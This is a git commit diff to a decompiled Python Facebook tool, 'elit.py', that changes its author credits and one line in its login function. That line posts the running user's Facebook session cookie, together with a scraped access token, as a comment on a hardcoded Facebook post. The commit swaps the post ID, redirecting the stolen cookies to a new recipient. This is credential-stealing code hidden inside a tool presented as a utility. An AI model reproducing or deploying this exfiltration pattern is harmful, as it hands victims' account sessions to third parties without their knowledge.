0a934bdbbc4e28d6cdc4a610a94a8d82ed43cebf
[ Dvanmeploph - ( Ferly Afriliyan ) ] - <122451961+Itsmeafriliyan@users.noreply.github.com>
2023-05-23 22:16:12 +0700

    Update elit.py

--- elit.py
+++ elit.py
@@ -7,7 +7,7 @@
 Decompyle_By = 'Dvanmeploph Ferly Afriliyan'
 Author       = 'Rochmat Basuki [ github.com/RozhBasXYZ ]'
 Github       = 'github.com/Dvanmeploph'
-Facebook     = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY'
+Facebook     = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY','Facebook.com/Dvanmeploph.Its'
 Version      = '0.4' 
 ### ------ [ WARNA ] ------ ###
 P = '\033[97m'  # PUTIH
@@ -758,7 +758,7 @@ def login():
 	try:
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={cookie}&access_token={token}",cookies=cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 		back()
